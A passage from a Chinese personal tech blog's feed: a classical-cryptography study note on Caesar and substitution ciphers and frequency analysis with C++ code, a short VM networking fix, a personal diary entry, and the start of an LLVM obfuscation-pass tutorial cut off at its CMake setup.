brute force caesar: gdkkn
... 下略
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到明文已经出现。&lt;/p>
&lt;p>凯撒密码的三个重要特征使我们可以穷举攻击：&lt;/p>
&lt;ol>
&lt;li>已知加解密的算法&lt;/li>
&lt;li>需测试的密钥只有25个&lt;/li>
&lt;li>明文所用的语言是已知的，而且意义易于识别&lt;/li>
&lt;/ol>
&lt;p>大多情况下，我们假设密码算法是已知的。一般密钥空间很大的算法可以使穷举攻击不太可能，例如3DES算法的密钥长度是 168 位，密钥空间是 2^168，有大于 3.7*10^50 种可能的密钥。&lt;/p>
&lt;p>如果明文所用的语言不为我们所知，那么明文输出就不可识别。输入也可能按照某种方式经过缩写或压缩，也就更不可能识别了。例如一个经过zip压缩的文本文件，用一种简单的代替密码来加密，那么即使用穷举法来进行密码分析，恢复出来的明文也是不可识别的。（注：实际上可以通过文件头、magic number 之类的已知特征来猜测出内容是被压缩过的）。&lt;/p>
&lt;h3 id="22-单表代替密码">2.2 单表代替密码&lt;/h3>
&lt;p>凯撒密码是一种代替密码，每个明文元素唯一对应代替表中的一个密文元素。因为代替表是字母表的循环移动，故密码范围只有 1-25。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110155545123.png"
width="571"
height="92"
srcset="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110155545123_hu3e213ee09efbd6d51e121868c96de46b_37508_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110155545123_hu3e213ee09efbd6d51e121868c96de46b_37508_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211110155545123"
class="gallery-image"
data-flex-grow="620"
data-flex-basis="1489px"
>&lt;/p>
&lt;p>定义术语&lt;strong>置换&lt;/strong>：设有限元素的集合 &lt;em>S&lt;/em> 的置换是 &lt;em>S&lt;/em> 的所有元素的有序排列，而且每个元素只出现一次。例如，如果有 &lt;code>S = {a,b,c}&lt;/code> ，则 &lt;em>S&lt;/em> 有 6 个置换：&lt;code>abc,acb,bac,bca,cab,cba&lt;/code> 。一般具有 n 个元素的集合有 &lt;code>n!&lt;/code> 个置换。&lt;/p>
&lt;p>如果代替表是26个字母的任意置换，那么就有 &lt;code>26!&lt;/code> 种可能的密钥，大于 &lt;code>4*10^26&lt;/code> 种可能，这比 DES 的密钥空间还要大 10 个数量级，看起来能抵挡穷举攻击了。&lt;/p>
&lt;p>这种方法被称为单表代替密码，每条消息用一个字母表（给出从明文字母到密文字母的映射）加密。&lt;/p>
&lt;h3 id="23-词频攻击">2.3 词频攻击&lt;/h3>
&lt;p>对于单表代替密码，如果攻击者知道明文的属性，比如知道明文是未经压缩的英文文本，就可以通过语言的一些统计学规律进行攻击。&lt;/p>
&lt;p>例如下图中的密文。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110160433970.png"
width="841"
height="141"
srcset="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110160433970_hu0bae56299b47face312e3af416d81f8d_75914_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110160433970_hu0bae56299b47face312e3af416d81f8d_75914_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211110160433970"
class="gallery-image"
data-flex-grow="596"
data-flex-basis="1431px"
>&lt;/p>
&lt;p>已知明文是英文文本，首先把字母使用的相对频率统计出来，与英文字母的使用频率分布进行比较。&lt;/p>
&lt;p>密文字母使用频率：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110160604203.png"
width="1345"
height="237"
srcset="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110160604203_hud2bc73f9e0917779ec0f259ca64b743c_85725_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110160604203_hud2bc73f9e0917779ec0f259ca64b743c_85725_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211110160604203"
class="gallery-image"
data-flex-grow="567"
data-flex-basis="1362px"
>&lt;/p>
&lt;p>英文字母使用频率：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110160620669.png"
width="884"
height="656"
srcset="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110160620669_hu4f20a761c6fb706ee66e5ab52766ee21_322944_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110160620669_hu4f20a761c6fb706ee66e5ab52766ee21_322944_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211110160620669"
class="gallery-image"
data-flex-grow="134"
data-flex-basis="323px"
>&lt;/p>
&lt;p>此时我们可以尝试在密文上做一些代替，填入明文，看看是否形成一个可读消息。更系统一点的方法是寻找其他规律，例如明文中有某些词可能是已知的，或者寻找密文字母中的重复序列，推导它们的等价明文。统计双字母组合的频率会是个很有效的工具。&lt;/p>
&lt;p>尝试分析的结果是：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110160738100.png"
width="831"
height="242"
srcset="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110160738100_hub66bc3a0a336c5d68333c334cbbee3ec_99281_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110160738100_hub66bc3a0a336c5d68333c334cbbee3ec_99281_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211110160738100"
class="gallery-image"
data-flex-grow="343"
data-flex-basis="824px"
>&lt;/p>
&lt;p>继续进行分析和测试可以很快得出完整的明文。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110161027735.png"
width="960"
height="111"
srcset="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110161027735_hu97cc0623de9f6e01bc3a236c731df603_66342_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110161027735_hu97cc0623de9f6e01bc3a236c731df603_66342_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211110161027735"
class="gallery-image"
data-flex-grow="864"
data-flex-basis="2075px"
>&lt;/p>
&lt;p>实践：&lt;/p>
&lt;p>实现一个简单的替代密码，用随机生成的密码表。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="n">substitution_cipher&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">plaintext&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">map&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">chart&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="n">output&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="nl">c&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">plaintext&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">try&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">push_back&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">chart&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">at&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tolower&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)));&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">out_of_range&lt;/span> &lt;span class="n">err&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;invalid input&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">output&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 替代密码表
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">map&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">chart&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;o&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;b&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;c&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;f&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;d&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;u&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;e&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;g&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;f&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;y&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;g&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;n&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;h&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;k&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span>
&lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;i&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;e&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;j&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;z&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;k&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;t&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;l&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;b&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;m&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;d&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;n&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;p&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;o&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;l&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;p&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;m&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span>
&lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;q&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;j&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;r&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;q&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;s&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;c&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;t&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;i&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;u&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;w&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;v&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;x&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;w&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;s&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;x&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;v&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span>
&lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;y&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;r&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;z&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;h&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39; &amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39; &amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;,&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;,&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;.&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;.&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="sc">&amp;#39;\&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;\&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">},&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">ciphertext&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">substitution_cipher&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;It can solve simple substitution ciphers often found in newspapers, including puzzles like cryptoquips&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">chart&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">ciphertext&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>加密结果：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">ei fop clbxg cedmbg cwacieiwielp femkgqc lyigp ylwpu ep pgscmomgqc, epfbwuepn mwhhbgc betg fqrmiljwemc
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以在 &lt;a class="link" href="https://www.quipqiup.com/" target="_blank" rel="noopener"
>quipquip&lt;/a> 尝试解密。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>Q：对称密码的本质成分&lt;/p>
&lt;p>明文、密文、密钥、加密算法、解密算法。&lt;/p>
&lt;p>Q：密码算法中的两个基本函数&lt;/p>
&lt;p>替代和置换。&lt;/p>
&lt;p>Q：用密码通信的两个人需要多少密钥&lt;/p>
&lt;p>1个（对称加密）或 2 个（公钥加密）。&lt;/p>
&lt;p>关于这点对书本有点困惑，实际经验告诉我需要至少4个密钥（发送方公钥、发送方私钥、接收方公钥、接收方私钥），书本里可能把一对公私钥算一个密钥。&lt;/p>
&lt;p>Q：分组密码和流密码的区别&lt;/p>
&lt;p>分组密码一次处理一组元素，一次输出一组元素。流密码连续处理输入元素，每次输出一个元素。&lt;/p>
&lt;p>Q：攻击密码的两种一般方法是什么&lt;/p>
&lt;p>密码分析和穷举。密码分析学攻击依赖于算法的性质、明文的一般特征或某些明密文对。这种攻击形式企图利用算法的特征来推导出特定的明文或使用的密钥。穷举法则是枚举所有可能的密钥，直到获得有意义的明文。&lt;/p>
&lt;p>Q：列出和定义基于攻击者所知信息的密码分析攻击类型&lt;/p>
&lt;ul>
&lt;li>唯密文攻击。已知算法和密文。&lt;/li>
&lt;li>已知明文攻击。已知算法、密文、明文。&lt;/li>
&lt;li>选择密文攻击。已知算法、密文、攻击者选择的明文和对应的密文。（攻击者可以控制待加密内容）&lt;/li>
&lt;li>选择明文攻击。已知算法、密文、攻击者选择的密文和对应的明文。（攻击者可以控制待解密内容）&lt;/li>
&lt;li>选择文本攻击。已知算法、密文、攻击者选择的密文和对应的明文、攻击者选择的明文和对应的密文。（攻击者可以自由加密/解密，但不知道密钥）&lt;/li>
&lt;/ul>
&lt;p>Q：无条件安全密码和计算上安全的密码区别是什么&lt;/p>
&lt;p>无条件安全密码无法从密文分析出密钥，不可破译。&lt;/p>
&lt;p>计算上安全的密码满足两个条件之一：&lt;/p>
&lt;ol>
&lt;li>破译密文的代价大于密文信息的价值。&lt;/li>
&lt;li>破译密码的时间超过密文信息的有效期。&lt;/li>
&lt;/ol>
&lt;p>Q：简要定义 Caesar 密码&lt;/p>
&lt;p>&lt;code>C = E(k, p) = (p + k) mod 26&lt;/code>&lt;/p>
&lt;p>&lt;code>p = D(k, C) = (C - k) mod 26&lt;/code>&lt;/p>
&lt;p>Q：简要定义单表代替密码&lt;/p>
&lt;p>允许字母任意替代，明文字母表和密文字母表是&lt;a class="link" href="https://baike.baidu.com/item/%E5%8F%8C%E5%B0%84/942799" target="_blank" rel="noopener"
>双射&lt;/a>的。&lt;/p></description></item><item><title>运维瞎记 2021年11月11日</title><link>https://nnnewb.github.io/blog/p/blind-op-2021-11-11/</link><pubDate>Thu, 11 Nov 2021 10:19:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/blind-op-2021-11-11/</guid><description>&lt;img src="https://nnnewb.github.io/blog/p/blind-op-2021-11-11/cover.png" alt="Featured image of post 运维瞎记 2021年11月11日" />&lt;h2 id="记虚拟机网络未连接">记虚拟机网络未连接&lt;/h2>
&lt;h3 id="起因">起因&lt;/h3>
&lt;p>因为Ubuntu server安装时更新的话需要从网络下载，慢的一批，所以安装的时候虚拟机的网络断开了，安装好启动之后才重新链接。&lt;/p>
&lt;p>但是&amp;hellip;&lt;/p>
&lt;p>连接后进入系统却发现并没有网络（VirtualBox），检查 &lt;code>networkctl&lt;/code> 发现 &lt;code>enp0s3&lt;/code> 是 &lt;code>off&lt;/code> 状态。&lt;/p>
&lt;h3 id="原因">原因&lt;/h3>
&lt;p>别问，不知道。&lt;/p>
&lt;h3 id="处理">处理&lt;/h3>
&lt;p>顺藤摸瓜不求甚解了。&lt;/p>
&lt;p>看到 &lt;code>enp0s3&lt;/code> 是 &lt;code>off&lt;/code> 那就先查查怎么解决。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">sudo ip link &lt;span class="nb">set&lt;/span> enp0s3 up
&lt;/code>&lt;/pre>&lt;/div>&lt;p>再检查连接状态。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">networkctl status
&lt;/code>&lt;/pre>&lt;/div>&lt;p>发现连接进入 &lt;code>downgrade&lt;/code> 状态，搜索得知是未分配 IP 地址。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">sudo dhclient enp0s3
&lt;/code>&lt;/pre>&lt;/div>&lt;p>报了一个奇怪的CMP什么的错误，不管了。再检查下网络。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">networkctl
&lt;/code>&lt;/pre>&lt;/div>&lt;p>发现 &lt;code>enp0s3&lt;/code> 进入 &lt;code>routable&lt;/code> 状态，大功告成。&lt;/p>
&lt;h3 id="总结">总结&lt;/h3>
&lt;p>我总结个蛋。&lt;/p></description></item><item><title>一些屁话 2021年11月4日</title><link>https://nnnewb.github.io/blog/p/2021-11-4-diary/</link><pubDate>Thu, 04 Nov 2021 16:06:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/2021-11-4-diary/</guid><description>&lt;h2 id="比烂">比烂&lt;/h2>
&lt;p>不知道什么时候起，对现在的工作失去了激情，连带着对生活也失去了期待。&lt;/p>
&lt;p>上班下班，例行公事，像是个机器人。虽然一直都是这样，从来没有好过。&lt;/p>
&lt;p>似乎也不是——至少在peropero工作的那段时间，还是有些兴奋的。只是确实各方面多少有些合不来，但个人原因还是居多数。毕竟多少已经摸爬滚打了几年下来，一定要说哪个老东家很好或者很差，恐怕都不合适。&lt;/p>
&lt;p>有优点也有缺点是常态，决定能不能持续干下去，最后还是看能不能忍受缺点。&lt;/p>
&lt;p>所以说到底还是比烂，到底万事万物还是比烂。&lt;/p>
&lt;h2 id="做人">做人&lt;/h2>
&lt;p>一个常常出现在脑海里的问题是，我应该做什么样的人？&lt;/p>
&lt;p>然后忽然就有了答案，那就是我不能决定自己成为什么样的人。环境塑造人，经历塑造人，唯独人不能塑造自己，所以说做什么样的人其实是伪命题。&lt;/p>
&lt;p>这么想有些悲观，是机械决定论。人一出生就已经决定了命运，所思所想，悲欢离合，早已经决定，生命就是概率之海的小水花，生或死都没有意义。&lt;/p>
&lt;p>但无论如何吧，至少，还得有一点念想？假装一切都在掌控之中，像是抓住浪潮中的浮木。所以还是得有个什么念想，要做一个什么样的人。&lt;/p>
&lt;p>我怎么想呢。&lt;/p>
&lt;p>做正确的事，也许不正确，也许现在以为是正确，将来又觉得不正确。而即便是这样也做不到。&lt;/p>
&lt;h2 id="时间">时间&lt;/h2>
&lt;p>现在是2021年11月4日，2021年也快要过去了，天气转凉。&lt;/p>
&lt;p>现在总结一年的工作或者生活还有些太早，但如今回头看，这一年也就这样吧。&lt;/p>
&lt;p>事业发展，没有变化。&lt;/p>
&lt;p>人生大事，没有进展。&lt;/p>
&lt;p>健康生活？被痛风折磨，头发肉眼可见地变得稀疏，还好发际线没有太明显的移动。精力虽然有些消退，但并没有什么妨害。&lt;/p>
&lt;p>想要看看还有没有什么提升的机会，发现国家又在教改，成人学历教育明年大概又有什么动作。随便翻了翻招生简章，就看到对25岁以上考生居然有优待。&lt;/p>
&lt;p>再一对自己的，哦豁，不用等明年，今年12月就成了被优待的对象了。&lt;/p>
&lt;p>已经快记不起上学时的光景了，好像所有东西都在飞快地远离。&lt;/p>
&lt;h2 id="变化">变化&lt;/h2>
&lt;p>时间给人带来最明显的变化就是内敛。&lt;/p>
&lt;p>不再轻易喜悦，也不再轻易动怒。&lt;/p>
&lt;p>与其说是沉稳，不如说是更焦虑了，为身边的一切事情焦虑，为自己的能力总是捉襟见肘焦虑。而后又容易放弃，因为总忍不住去对比已知的成本和未知的收益，又或者因为各种内外条件变化而不了了之。&lt;/p>
&lt;p>明知道抱怨没有意义，还是忍不住抱怨，每天都有发泄不完的情绪。&lt;/p>
&lt;h2 id="终">终&lt;/h2>
&lt;p>写了那么多屁话，还是要到这里结束。&lt;/p>
&lt;p>生活还要继续。&lt;/p></description></item><item><title>加壳原理08：混淆技术入门</title><link>https://nnnewb.github.io/blog/p/learning-packer-08/</link><pubDate>Wed, 03 Nov 2021 16:54:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/learning-packer-08/</guid><description>&lt;img src="https://nnnewb.github.io/blog/p/learning-packer-08/cover.jpg" alt="Featured image of post 加壳原理08：混淆技术入门" />&lt;h2 id="前言">前言&lt;/h2>
&lt;p>本篇尝试学习通过动手写一个 LLVM Pass 来学习编译阶段进行代码混淆的技术。&lt;/p>
&lt;h2 id="0x01-环境设置">0x01 环境设置&lt;/h2>
&lt;p>LLVM 是个相当大的项目，做好环境设置是首先要做的事情。这里选择 msys2 作为首要开发环境，不然光是 MSVC 把 LLVM 源码编译一遍就够呛了。&lt;/p>
&lt;p>安装好MSYS2之后安装 clang 工具链（2021年11月3日，clang32工具链默认不在msys2的源里，需要手动改 &lt;code>pacman.conf&lt;/code> 加入 &lt;code>clang32&lt;/code> 源，这里以 x86_64 的 LLVM 工具链进行实践）。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">pacman -Sy mingw-w64-clang-x86_64-toolchain
&lt;/code>&lt;/pre>&lt;/div>&lt;p>完成后添加环境变量，把 msys2 安装目录下的 &lt;code>clang64/bin&lt;/code> 加入环境变量，方便 VSCode + CMake 找到工具链。另外注意装一个 Ninja，同样加入 Path。&lt;/p>
&lt;p>VSCode 里装上微软的 C/C++ 和 clangd，禁用微软 C/C++ 的 Intellisense，实在太慢。&lt;/p>
&lt;p>手动编译整个LLVM源码树实在是太费时间了，我选择用MSYS2的工具链。参考这篇文档去配置一个 LLVM 源码树外的 Pass 工程：&lt;a class="link" href="https://llvm.org/docs/CMake.html#cmake-out-of-source-pass" target="_blank" rel="noopener"
>CMake out of source pass - LLVM&lt;/a> 。写一个简单的 CMakeLists.txt ，跟着 &lt;a class="link" href="https://llvm.org/docs/WritingAnLLVMPass.html" target="_blank" rel="noopener"
>Writing an LLVM Pass - LLVM&lt;/a> 这篇文档快速实现一个遍历函数的 Pass 。&lt;/p>
&lt;p>下面是 &lt;code>CMakeLists.txt&lt;/code> 的内容&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmake" data-lang="cmake">&lt;span class="nb">cmake_minimum_required&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">VERSION&lt;/span> &lt;span class="s">3.13.4&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">project&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">Hello&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">find_package&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">LLVM&lt;/span> &lt;span class="s">REQUIRED&lt;/span> &lt;span class="s">CONFIG&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
